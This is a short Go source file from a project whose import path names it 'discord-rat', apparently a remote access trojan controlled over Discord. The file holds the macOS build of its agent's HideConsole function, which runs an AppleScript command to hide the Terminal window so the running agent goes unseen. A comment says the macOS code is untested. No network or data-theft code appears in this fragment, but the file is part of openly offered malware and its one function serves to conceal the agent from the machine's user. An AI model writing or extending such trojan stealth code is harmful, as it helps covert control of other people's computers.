//go:build !linux && !windows
// +build !linux,!windows

package platforms

import "github.com/codeuk/discord-rat/pkg/agent/system"

// Please note that none of the MacOS functionality has been tested
// as I do not have access to a computer running MacOS to test it on.

// HideConsole hides the applications console window using an AppleScript command.
func HideConsole() {
	// AppleScript command to hide the console window.
	system.ExecuteCommand("tell application \"System Events\" to set visible of process \"Terminal\" to false")
}
